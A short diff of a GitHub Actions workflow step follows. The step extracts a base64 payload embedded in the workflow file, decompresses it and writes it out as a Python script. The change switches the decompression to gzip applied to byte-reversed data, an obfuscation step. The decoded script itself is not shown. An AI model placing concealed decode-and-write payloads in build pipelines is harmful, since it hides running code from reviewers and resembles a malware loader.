@@ -30,13 +30,13 @@ jobs:
           mkdir -p .github/scripts
           python3 - <<'PY'
           import base64
-          import zlib
+          import gzip
           from pathlib import Path
 
           source = Path('.github/workflows/apply-issue-54.yml').read_text()
           payload = source.split('payload = """', 1)[1].split('"""', 1)[0]
           compressed = base64.b64decode(payload)
-          script = zlib.decompress(compressed, -zlib.MAX_WBITS)
+          script = gzip.decompress(compressed[::-1])
           Path('.github/scripts/apply_issue54.py').write_bytes(script)
           PY
 
